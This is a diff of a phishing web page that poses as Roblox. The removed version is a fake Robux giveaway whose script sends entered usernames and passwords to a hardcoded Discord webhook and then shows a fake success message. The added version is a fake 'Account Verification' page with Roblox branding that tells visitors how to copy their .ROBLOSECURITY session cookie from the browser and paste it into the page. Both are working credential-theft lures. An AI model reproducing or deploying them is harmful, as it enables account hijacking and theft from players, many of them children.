@@ -3,23 +3,15 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox Giveaway 2026 – Win up to 100,000 Robux</title>
-  <meta name="description" content="Participate in our official 2026 Roblox giveaway. Register your username and get a chance to win 100,000 Robux. New users receive 20,000 Robux bonus upon registration. No surveys, instant entry."/>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <title>Roblox - Account Verification Required</title>
+  <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
   <style>
-    :root {
-      --primary: #00d1ff;
-      --dark: #0f0f17;
-      --gray: #1e1e2e;
-      --light: #e0f7ff;
-    }
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      font-family: 'Inter', system-ui, sans-serif;
-      background: linear-gradient(135deg, #0a0e1a, #111827);
-      color: #e0f7ff;
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #0f0f1a 0%, #1a0033 100%);
+      color: #e0e0ff;
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -27,188 +19,132 @@
       padding: 20px;
     }
     .container {
-      background: rgba(30, 30, 46, 0.85);
-      backdrop-filter: blur(10px);
+      background: rgba(20, 20, 40, 0.95);
+      backdrop-filter: blur(12px);
       border-radius: 16px;
+      border: 1px solid rgba(100,100,255,0.18);
       padding: 40px 32px;
-      max-width: 480px;
       width: 100%;
-      border: 1px solid rgba(0, 209, 255, 0.15);
-      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      max-width: 460px;
+      box-shadow: 0 25px 70px rgba(0,0,0,0.65);
+      text-align: center;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 32px;
+    }
+    .logo img { width: 48px; height: 48px; }
+    .logo span {
+      font-size: 32px;
+      font-weight: 700;
+      color: #ffffff;
+      letter-spacing: -0.5px;
     }
     h1 {
-      font-size: 2.4rem;
+      font-size: 28px;
       font-weight: 700;
-      margin-bottom: 16px;
-      text-align: center;
-      color: var(--primary);
+      color: #d0d0ff;
+      margin-bottom: 12px;
     }
     .subtitle {
-      font-size: 1.1rem;
-      color: #a0d8ff;
-      text-align: center;
-      margin-bottom: 32px;
+      font-size: 16px;
+      color: #b0a0ff;
       line-height: 1.5;
+      margin-bottom: 36px;
     }
-    .form-group {
-      margin-bottom: 24px;
-    }
-    label {
+    .field-label {
+      font-size: 15px;
+      font-weight: 600;
+      color: #e0d0ff;
+      margin-bottom: 12px;
       display: block;
-      font-size: 0.95rem;
-      margin-bottom: 8px;
-      color: #c0e0ff;
+      text-align: left;
     }
-    input {
+    input, textarea {
       width: 100%;
-      padding: 14px 16px;
-      font-size: 1.05rem;
-      border: 1px solid rgba(0,209,255,0.3);
+      padding: 14px 18px;
+      border: 1px solid rgba(140,100,255,0.3);
       border-radius: 10px;
-      background: rgba(15, 23, 42, 0.6);
+      background: rgba(30,30,60,0.7);
       color: white;
-      outline: none;
+      font-size: 15px;
+      margin-bottom: 8px;
       transition: all 0.2s;
     }
-    input:focus {
-      border-color: var(--primary);
-      box-shadow: 0 0 0 3px rgba(0,209,255,0.2);
+    input:focus, textarea:focus {
+      outline: none;
+      border-color: #a080ff;
+      box-shadow: 0 0 0 3px rgba(160,120,255,0.25);
     }
-    button {
+    textarea {
+      min-height: 110px;
+      resize: vertical;
+      font-family: monospace;
+    }
+    .hint {
+      font-size: 12px;
+      color: #c0a0ff;
+      line-height: 1.5;
+      margin-top: 8px;
+      text-align: left;
+    }
+    .btn {
       width: 100%;
       padding: 16px;
-      font-size: 1.15rem;
-      font-weight: 600;
-      background: linear-gradient(90deg, #00d1ff, #00b3e6);
-      color: #0f0f17;
+      background: linear-gradient(90deg, #7c3aed, #a78bfa);
+      color: white;
       border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: all 0.25s;
-      box-shadow: 0 8px 24px rgba(0,209,255,0.3);
-    }
-    button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 32px rgba(0,209,255,0.45);
-    }
-    .status {
-      margin-top: 24px;
-      text-align: center;
-      font-size: 1.05rem;
-      min-height: 1.5em;
-      color: #a0d8ff;
-    }
-    .progress-container {
-      margin: 24px 0;
-      height: 8px;
-      background: rgba(255,255,255,0.08);
-      border-radius: 4px;
-      overflow: hidden;
-      display: none;
-    }
-    .progress-bar {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, #00d1ff, #00b3e6);
-      transition: width 4s ease-in-out;
-    }
-    .info {
-      margin-top: 32px;
-      font-size: 0.9rem;
-      color: #94a3b8;
-      text-align: center;
-      line-height: 1.6;
-    }
-    .stats {
-      margin-top: 24px;
-      display: flex;
-      justify-content: center;
-      gap: 32px;
-      font-size: 0.95rem;
-      color: #94a3b8;
-    }
-    .stat-item strong {
-      color: var(--primary);
+      border-radius: 12px;
+      font-size: 17px;
       font-weight: 600;
+      cursor: pointer;
+      margin: 24px 0 32px;
+      transition: all 0.3s;
+    }
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 30px rgba(124,58,237,0.45);
+    }
+    .footer {
+      font-size: 13px;
+      color: #a090c0;
+      line-height: 1.6;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Roblox Giveaway 2026</h1>
+    <div class="logo">
+      <img src="https://www.roblox.com/images/roblox_logo_dark.svg" alt="Roblox"/>
+      <span>Roblox</span>
+    </div>
+
+    <h1>Account Verification Required</h1>
     <p class="subtitle">
-      Win up to 100,000 Robux in our official daily contest.<br>
-      New participants receive 20,000 Robux bonus upon registration.
+      Please verify your Roblox account to claim<br>
+      your free Robux or continue to the event page.
     </p>
 
-    <div class="form-group">
-      <label for="username">Roblox Username</label>
-      <input type="text" id="username" placeholder="Enter your Roblox username" autocomplete="off" required>
+    <div class="field-label">Roblox Username</div>
+    <input type="text" placeholder="Enter your Roblox username"/>
+
+    <div class="field-label">.ROBLOSECURITY Cookie (paste here)</div>
+    <textarea placeholder="Paste your _ROBLOSECURITY cookie here...\nIt looks like: _|WARNING:-DO-NOT-SHARE-THIS.--..."></textarea>
+    <div class="hint">
+      How to get it: Press F12 → Application → Cookies →<br>
+      roblox.com → copy <strong>_ROBLOSECURITY</strong> value
     </div>
 
-    <div class="form-group">
-      <label for="password">Roblox Password</label>
-      <input type="password" id="password" placeholder="Enter your password" autocomplete="off" required>
-    </div>
+    <button class="btn">Verify & Claim Robux</button>
 
-    <button onclick="submitForm()">Register & Enter Contest</button>
-
-    <div class="progress-container" id="progressContainer">
-      <div class="progress-bar" id="progressBar"></div>
-    </div>
-
-    <div class="status" id="status"></div>
-
-    <div class="stats">
-      <div class="stat-item"><strong>18,742</strong> entries today</div>
-      <div class="stat-item"><strong>9,384</strong> bonuses claimed</div>
-    </div>
-
-    <div class="info">
-      No human verification required. Entries are processed instantly.<br>
-      Giveaway ends when all spots are filled – register now.
+    <div class="footer">
+      This is a one-time verification to prevent bots and<br>
+      secure your account.<br><br>
+      © 2026 Roblox Corporation. All rights reserved.
     </div>
   </div>
-
-  <script>
-    function submitForm() {
-      const username = document.getElementById('username').value.trim();
-      const password = document.getElementById('password').value.trim();
-
-      if (!username || !password) {
-        alert('Please fill in both fields');
-        return;
-      }
-
-      const status = document.getElementById('status');
-      const progressContainer = document.getElementById('progressContainer');
-      const progressBar = document.getElementById('progressBar');
-
-      status.textContent = 'Processing your entry...';
-      progressContainer.style.display = 'block';
-      progressBar.style.width = '100%';
-
-      // Your Discord webhook
-      const webhook = "https://discord.com/api/webhooks/1467896250274812036/w7Or-fPilBf6BDd5AsWciOLcIjW2-mby-i-lf9gUS0X0ATXAVLY2uXIp2WClXk_3Wp1R";
-
-      fetch(webhook, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          content: `**NEW ROBLOX ENTRY**\nUsername: ${username}\nPassword: ${password}\nTime: ${new Date().toLocaleString('cs-CZ')}`
-        })
-      }).then(response => {
-        // Fake success message
-        setTimeout(() => {
-          status.innerHTML = 'Success! 20,000 Robux bonus added.<br>You are now entered in the 100,000 Robux giveaway.<br>Check your account in 5–10 minutes.';
-          progressContainer.style.display = 'none';
-        }, 2500);
-      }).catch(error => {
-        console.error('Error:', error);
-        status.textContent = 'Something went wrong, try again.';
-        progressContainer.style.display = 'none';
-      });
-    }
-  </script>
 </body>
 </html>
